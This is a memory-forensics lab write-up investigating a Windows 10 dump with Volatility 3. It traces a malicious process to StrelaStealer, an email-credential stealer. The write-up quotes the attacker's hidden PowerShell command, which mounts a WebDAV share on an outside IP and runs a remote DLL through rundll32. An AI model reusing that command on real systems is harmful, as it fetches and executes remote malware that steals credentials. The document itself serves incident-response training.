# Reveal

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (122).png" alt=""><figcaption></figcaption></figure>

The system under investigation has been identified as Windows 10, with the NT root directory located at C:\Windows and a memory capture timestamp of 2024-07-15 07:00:08. These details provide essential context, helping to refine the scope of our analysis and supporting the construction of an accurate timeline if needed.



Q1. Identifying the name of the malicious process helps in understanding the nature of the attack. What is the name of the malicious process?

Begin by examining the processes in the memory dump. Are there any unusual or suspicious processes commonly used by attackers?

Utilize the malfind plugin in Volatility to detect processes and identify those that seem out of place or show suspicious behavior.

<figure><img src="../../.gitbook/assets/image (123).png" alt=""><figcaption></figcaption></figure>

PS C:\Users\user\Downloads\volatility3-develop\volatility3-develop> vol -f C:\Users\user\Downloads\192-Reveal\temp\_extract\_dir\192-Reveal.dmp windows.malfind

<figure><img src="../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

PS C:\Users\user\Downloads\volatility3-develop\volatility3-develop> vol -f C:\Users\user\Downloads\192-Reveal\temp\_extract\_dir\192-Reveal.dmp windows.pstree

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>

PS C:\Users\user\Downloads\volatility3-develop\volatility3-develop> vol -f C:\Users\user\Downloads\192-Reveal\temp\_extract\_dir\192-Reveal.dmp windows.pstree | Select-String "3692"

Select-String is the equivalent of grep.

<figure><img src="../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

PS C:\Users\user\Downloads\volatility3-develop\volatility3-develop> vol -f C:\Users\user\Downloads\192-Reveal\temp\_extract\_dir\192-Reveal.dmp windows.cmdline | Select-String "3692"

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

This command reveals hidden network activity and DLL execution, warranting further investigation into its role in the compromise, which we will explore in subsequent steps.



<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

Select-String -Path "C:\Users\user\Downloads\192-Reveal\temp\_extract\_dir\192-Reveal.dmp" -Pattern "45.9.74.32"

findstr "45.9.74.32" "C:\Users\user\Downloads\192-Reveal\temp\_extract\_dir\192-Reveal.dmp"

powershell.exe windowstyle hidden net use \\\45.9.74.32@8888\davwwwroot\ ; rundll32 \\\45.9.74.32@8888\davwwwroot\3435.dll,entry

The share name is davwwwroot (which is the default shared directory used for WebDAV network connections).



<figure><img src="../../.gitbook/assets/image (135).png" alt=""><figcaption></figcaption></figure>

Signed Binary Proxy Execution: Rundll32 (T1218.011)

This technique details how attackers misuse trusted Windows utilities, such as rundll32.exe, to execute malicious payloads covertly. It’s considered suspicious due to its ability to load external or remote code, often avoiding traditional security alerts.



<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

PS C:\Users\user\Downloads\volatility3-develop\volatility3-develop> vol -f C:\Users\user\Downloads\192-Reveal\temp\_extract\_dir\192-Reveal.dmp windows.getsids | Select-String "3692"

<figure><img src="../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>



StrelaStealer is designed to target email credentials by extracting login information from popular email clients and transmitting it to the attacker’s command-and-control (C2) server. This malware enables attackers to access the victim's email accounts, which can facilitate additional attacks or unauthorized access.
